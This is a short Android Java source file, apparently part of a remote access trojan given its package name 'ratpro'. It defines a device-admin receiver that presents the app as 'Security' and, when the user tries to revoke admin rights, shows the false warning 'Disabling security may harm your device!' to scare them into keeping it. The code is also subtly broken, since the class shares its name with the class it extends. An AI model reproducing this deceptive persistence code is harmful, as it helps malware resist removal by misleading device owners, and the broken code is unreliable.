package com.realzy.ratpro;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class DeviceAdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        // Device admin berhasil diaktifkan
        Toast.makeText(context, "Security activated", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // Device admin dinonaktifkan
        Toast.makeText(context, "Security deactivated", Toast.LENGTH_SHORT).show();
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // Munculin peringatan pas user mau nonaktifin admin
        return "Disabling security may harm your device!";
    }
}